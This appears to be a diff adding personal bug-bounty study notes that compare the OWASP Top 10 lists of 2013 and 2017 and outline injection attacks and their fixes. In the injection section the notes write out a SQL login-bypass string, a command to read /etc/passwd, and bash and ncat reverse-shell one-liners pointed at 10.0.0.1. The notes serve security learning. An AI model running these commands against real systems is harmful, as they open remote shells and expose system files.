@@ -1,0 +1,51 @@
+**Bug bounty journey**
+
+OWASP and injection
+
+- What is OWASP
+- Why OWASP is important for us
+- why do we follow OWASP
+- OWASP TOP 10 2013
+- OWASP TOP 10 2017
+- Key Differences
+
+2013
+	INJECTION
+	BASM
+	XSS
+	IDOR
+	SECURITY MISCONFIGURATION
+	SDE
+	MFLAC
+	CSRF
+	USING COMPONENTS WITH KNOWN VULNS
+	UNVALIDATED REDIRECT AND FORWARDS
+2017
+	INJECTION
+	BA
+	XSS
+	SECURITY MISCONFIGURATION
+	SDE
+	USING COMPONENTS WITH KNOWN VULNS
+	*XXE*
+	*INSECURE DESERIALIZATION*
+	*BAC*
+	*INSUFFICIENT LOGGING AND MONITORING*
+	
+	*new categories*
+	
+INJECTION
+	WHAT IS:
+	TYPES: SQL Injection, LDAP injection, OS injection, Command execution, Ruby injection, Shell Shock e etc...
+	
+	- what can be achieved by injection?
+		*SQLi: "101 OR 1=1" (True query to do login bypass)
+		*cat /etc/passwd (command to read users in linux)
+		bash -i >& /dev/tcp/10.0.0.1/4242 0>&1 (one liner bash for reverse conn)
+		ncat 10.0.0.1 4242 -e /bin/bash (one line nc for reverse conn)
+		
+	- How do we fix injection issues
+		* Input Validation
+		* Escaping aka Output Encoding
+		* Parameterized Queries
+	
